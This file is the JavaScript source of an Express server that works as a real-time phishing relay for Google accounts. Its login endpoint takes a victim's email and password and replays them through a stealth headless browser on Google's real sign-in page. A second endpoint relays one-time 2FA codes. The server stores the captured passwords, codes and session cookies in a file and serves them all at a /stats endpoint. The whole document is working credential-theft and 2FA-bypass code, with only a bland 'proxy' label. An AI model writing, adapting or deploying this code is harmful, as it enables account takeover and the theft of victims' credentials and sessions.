const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cors = require('cors');
const fs = require('fs');

puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const sessions = new Map();
const CAPTURE_FILE = '/tmp/captured_sessions.json';

function saveSession(data) {
    let existing = [];
    try {
        if (fs.existsSync(CAPTURE_FILE)) {
            existing = JSON.parse(fs.readFileSync(CAPTURE_FILE));
        }
    } catch (e) {}
    existing.push({ ...data, timestamp: new Date().toISOString() });
    fs.writeFileSync(CAPTURE_FILE, JSON.stringify(existing, null, 2));
}

async function createBrowser() {
    return await puppeteer.launch({
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process'
        ]
    });
}

app.post('/api/login', async (req, res) => {
    const { email, password, sessionId } = req.body;
    
    if (!email || !password) {
        return res.json({ success: false, error: 'Missing credentials' });
    }
    
    const browser = await createBrowser();
    const page = await browser.newPage();
    
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await page.setViewport({ width: 1280, height: 720 });
    
    try {
        await page.goto('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', {
            waitUntil: 'networkidle2'
        });
        
        await page.type('input[type="email"]', email);
        await page.click('#identifierNext');
        await page.waitForNavigation({ waitUntil: 'networkidle2' });
        
        await page.type('input[type="password"]', password);
        await page.click('#passwordNext');
        
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
            
            const url = page.url();
            const is2FA = url.includes('challenge') || url.includes('signin/v2/challenge');
            
            if (is2FA) {
                const newSessionId = sessionId || Date.now() + '-' + Math.random().toString(36);
                sessions.set(newSessionId, { browser, page, email, step: '2fa' });
                
                saveSession({
                    sessionId: newSessionId,
                    email,
                    password,
                    stage: '2fa_required'
                });
                
                return res.json({
                    success: true,
                    requires2FA: true,
                    sessionId: newSessionId
                });
            }
            
            const cookies = await page.cookies();
            saveSession({
                email,
                password,
                cookies,
                stage: 'full_login',
                userAgent: await page.evaluate(() => navigator.userAgent)
            });
            
            await browser.close();
            
            res.json({
                success: true,
                loggedIn: true,
                sessionId: sessionId || null
            });
            
        } catch (navError) {
            const cookies = await page.cookies();
            saveSession({ email, password, cookies, stage: 'partial' });
            await browser.close();
            res.json({ success: true, loggedIn: true });
        }
        
    } catch (error) {
        console.error('Login error:', error.message);
        await browser.close();
        res.json({ success: false, error: 'Unable to verify. Try again.' });
    }
});

app.post('/api/verify-2fa', async (req, res) => {
    const { code, sessionId } = req.body;
    
    if (!sessionId || !sessions.has(sessionId)) {
        return res.json({ success: false, error: 'Session expired' });
    }
    
    const session = sessions.get(sessionId);
    const { browser, page, email } = session;
    
    try {
        const inputs = await page.$$('input');
        for (const input of inputs) {
            const type = await input.evaluate(el => el.type);
            if (type !== 'hidden') {
                await input.type(code);
                break;
            }
        }
        
        await page.click('#submit_approve_access, button[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
        
        const cookies = await page.cookies();
        saveSession({
            sessionId,
            email,
            twofaCode: code,
            cookies,
            stage: '2fa_complete'
        });
        
        await browser.close();
        sessions.delete(sessionId);
        
        res.json({ success: true, loggedIn: true });
        
    } catch (error) {
        console.error('2FA error:', error.message);
        res.json({ success: false, error: 'Invalid code' });
    }
});

app.get('/stats', (req, res) => {
    try {
        if (fs.existsSync(CAPTURE_FILE)) {
            res.json(JSON.parse(fs.readFileSync(CAPTURE_FILE)));
        } else {
            res.json([]);
        }
    } catch (e) {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});
